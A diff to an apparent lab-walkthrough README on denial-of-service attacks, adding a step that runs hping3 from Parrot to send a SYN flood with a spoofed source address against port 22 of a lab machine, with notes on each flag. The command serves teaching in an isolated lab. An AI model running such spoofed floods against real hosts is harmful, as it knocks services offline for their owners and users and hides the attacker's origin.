@@ -84,9 +84,13 @@ Step 8.	Now, type cd and press Enter to jump to the root directory.
 </p>
 
 <p align="center">
-  step . 
+  step 9.	A Parrot Terminal window appears; type hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood and press Enter. 
+Note: Here, the target IP address is 10.10.1.11 [Windows 11], and the spoofable IP address is 10.10.1.19 [Windows Server 2019] 
+Note: -S: sets the SYN flag; -a: spoofs the IP address; -p: specifies the destination port; and -flood: sends a huge number of packets. 
+
  <br/>
-  <img src=alt="image" style="width: 50%; height: auto; display: block; margin: 0 auto;"/>
+  <img src="https://github.com/karanja26/Denial-of-service-DoS-/assets/55892563/86463945-1719-402c-a86c-f0e7f8359233"
+alt="image" style="width: 50%; height: auto; display: block; margin: 0 auto;"/>
   <br/>
 </p>
 
